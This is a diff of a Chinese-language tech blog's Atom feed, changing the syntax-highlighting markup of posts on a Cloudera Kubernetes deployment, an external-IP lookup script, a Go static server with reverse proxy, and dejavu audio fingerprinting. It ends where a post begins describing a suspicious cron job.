+        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;config&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;mountPath&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/opt/cm/etc/cloudera-scm-agent/&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;containerPort&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;9000&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;agent&lt;/span&gt;
+        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;containerPort&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;7182&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server&lt;/span&gt;
+        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;containerPort&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;7191&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;parcel&lt;/span&gt;
+        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;containerPort&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;4434&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;parcel-ssl&lt;/span&gt;
+        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;containerPort&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;4433&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;parcel-ssl2&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;securityContext&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;privileged&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;true&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;imagePullSecrets&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;registrykey-vpc&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;config&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;configMap&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-config&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;items&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+          &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;config.ini&lt;/span&gt;
+            &lt;span class=&quot;na&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;config.ini&lt;/span&gt;
+          &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cron.tab&lt;/span&gt;
+            &lt;span class=&quot;na&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cron.tab&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;repo&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;nfs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;074ca49d80-ak47.cn-hangzhou.nas.aliyuncs.com&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/pv/cloudera/repo/&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;volumeClaimTemplates&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;lib&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;spec&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;#volumeName: lib&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;volumeMode&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Filesystem&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;accessModes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ReadWriteOnce&quot;&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;storageClassName&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-storage&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;resources&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;storage&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;20Gi&lt;/span&gt;
+&lt;span class=&quot;nn&quot;&gt;---&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;extensions/v1beta1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Ingress&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cdh-master-ing&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;spec&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cdh.docs.aliyun.com&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;paths&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;backend&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;serviceName&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;master-external&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;servicePort&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;7180&lt;/span&gt;
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;注意事项&quot;&gt;注意事项&lt;/h2&gt;
 &lt;ul&gt;
@@ -1217,32 +1198,30 @@ hdfs==2.1.0
 
 &lt;h3 id=&quot;看这里&quot;&gt;看这里&lt;/h3&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#Function: gtIp&lt;/span&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#Function: gtIp&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;#Author: zhangjianxin&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;#Time: 2018-08-30&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;#! /bin/bash&lt;/span&gt;
 
 
-&lt;span class=&quot;nv&quot;&gt;bashpath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dirname &lt;span class=&quot;nv&quot;&gt;$0&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;; &lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;bashpath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dirname &lt;span class=&quot;nv&quot;&gt;$0&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;nv&quot;&gt;brokerName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dev_rocketmq_4.3.0
 &lt;span class=&quot;c&quot;&gt;#########################setting#######################&lt;/span&gt;
 &lt;span class=&quot;nv&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://ip.cn/&quot;&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;curl -o /dev/null -s -m 10 --connect-timeout 10 -w %&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;http_code&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$URL&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;Result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /dev/null &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 10 &lt;span class=&quot;nt&quot;&gt;--connect-timeout&lt;/span&gt; 10 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; %&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;http_code&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$URL&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
 &lt;span class=&quot;nv&quot;&gt;Test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$Result&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Test&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;200&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;then
-	&lt;/span&gt;curl -s -o &lt;span class=&quot;nv&quot;&gt;$bashpath&lt;/span&gt;/ip.html &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+	&lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$bashpath&lt;/span&gt;/ip.html &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
 	&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;search inter ip &quot;&lt;/span&gt;
-        &lt;span class=&quot;nv&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;cat &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;bashpath&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;/ip.html  | sed  &lt;span class=&quot;s1&quot;&gt;'s/：/ /g'&lt;/span&gt; | awk &lt;span class=&quot;s1&quot;&gt;'{print$3}'&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;bashpath&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;/ip.html  | sed  &lt;span class=&quot;s1&quot;&gt;'s/：/ /g'&lt;/span&gt; | awk &lt;span class=&quot;s1&quot;&gt;'{print$3}'&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
 	&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt;
     rm &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;bashpath&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;/ip.html
 &lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    awk &lt;span class=&quot;s1&quot;&gt;'!seen[$0]++'&lt;/span&gt; &amp;lt;filename&amp;gt; &lt;span class=&quot;c&quot;&gt;# 去重行&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    awk &lt;span class=&quot;s1&quot;&gt;'!seen[$0]++'&lt;/span&gt; &amp;lt;filename&amp;gt; &lt;span class=&quot;c&quot;&gt;# 去重行&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>unknow :)</name></author><summary type="html">阿里云外网服务器如何获得外网IP。</summary></entry><entry><title type="html">Go实现 静态页面服务器与反向代理在同一个端口进行工作.</title><link href="http://firsh.me/2018/08/08/go_proxy_and_static_web/" rel="alternate" type="text/html" title="Go实现 静态页面服务器与反向代理在同一个端口进行工作." /><published>2018-08-08T15:03:28+08:00</published><updated>2018-08-08T15:03:28+08:00</updated><id>http://firsh.me/2018/08/08/go_proxy_and_static_web</id><content type="html" xml:base="http://firsh.me/2018/08/08/go_proxy_and_static_web/">&lt;h1 id=&quot;这是一个简单的-静态服务器自带反向代理&quot;&gt;这是一个简单的 静态服务器，自带反向代理.&lt;/h1&gt;
 
@@ -1250,29 +1229,27 @@ hdfs==2.1.0
 
 &lt;ul&gt;
   &lt;li&gt;1，如何配置
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;s2&quot;&gt;&quot;firsh.cc&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# 这个url需要在 host文件里面修改一下下面会讲&lt;/span&gt;
     &lt;span class=&quot;s2&quot;&gt;&quot;/api&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;localhost:8005&quot;&lt;/span&gt;,  &lt;span class=&quot;c&quot;&gt;# 需要代理的服务器地址 与mock一致即可 忽略POST，GET DELETE等方法&lt;/span&gt;
     &lt;span class=&quot;s2&quot;&gt;&quot;*&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;/Users/zhangjianxin/home/GO_LIB/src/github.com/breakEval13/libs/lib/staticweb/root&quot;&lt;/span&gt;
     &lt;span class=&quot;c&quot;&gt;# 上面的文件路径为dist目录&lt;/span&gt;
     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
   &lt;/li&gt;
   &lt;li&gt;2 host如何进行映射&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-➜  Desktop cat /etc/hosts
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+➜  Desktop &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/hosts
 &lt;span class=&quot;c&quot;&gt;##&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# Host Database&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
 127.0.0.1    firsh.me &lt;span class=&quot;c&quot;&gt;# 这里&lt;/span&gt;
 127.0.0.1    firsh.cc &lt;span class=&quot;c&quot;&gt;# 这里&lt;/span&gt;
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;ul&gt;
   &lt;li&gt;windows 同理进行修改hosts文件&lt;/li&gt;
 &lt;/ul&gt;
@@ -1321,7 +1298,7 @@ chmod +x  xxxx
   &lt;li&gt;将音频数据分析的结果存储到数据库&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;dejavu&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Dejavu&lt;/span&gt;
 
@@ -1342,14 +1319,13 @@ chmod +x  xxxx
 &lt;span class=&quot;n&quot;&gt;djv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fingerprint_directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/Users/zhangjianxin/home/mp3/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;.mp3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;djv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_num_fingerprints&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;ul&gt;
   &lt;li&gt;监听麦克风进行识别歌曲&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;
 
 
@@ -1374,19 +1350,18 @@ chmod +x  xxxx
     &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;No Match&quot;&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;song&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;需要用到的工具&quot;&gt;需要用到的工具&lt;/h2&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python 2.7
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python 2.7
 
 brew install portaudio
 brew install ffmpeg
 brew install mysql-connector-c &lt;span class=&quot;c&quot;&gt;# my_config.h&lt;/span&gt;
 brew install mysql
 &lt;span class=&quot;c&quot;&gt;#!!!  mysql-connector-c (my_config.h) -&amp;gt;  mysql&lt;/span&gt;
-ln -s  ../../../../mysql-connector-c/6.1.11/include/my_config.h ./
+ln &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt;  ../../../../mysql-connector-c/6.1.11/include/my_config.h ./
 
 
 brew link mysql &lt;span class=&quot;c&quot;&gt;# create links&lt;/span&gt;
@@ -1395,8 +1370,7 @@ pip install mysql-python
 pip install &lt;span class=&quot;nv&quot;&gt;numpy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;1.10.2 &lt;span class=&quot;c&quot;&gt;# 版本兼容性问题&lt;/span&gt;
 pip install PyDejavu
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;http://zmatsh.b0.upaiyun.com/demos/788db197-f796-42d2-8ea5-ef655160e7c5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
@@ -1418,9 +1392,8 @@ pip install PyDejavu
   &lt;li&gt;
     &lt;ol&gt;
       &lt;li&gt;检查 &lt;code class=&quot;highlighter-rouge&quot;&gt;crontab -l &lt;/code&gt; 发现了一个莫名其妙的 job
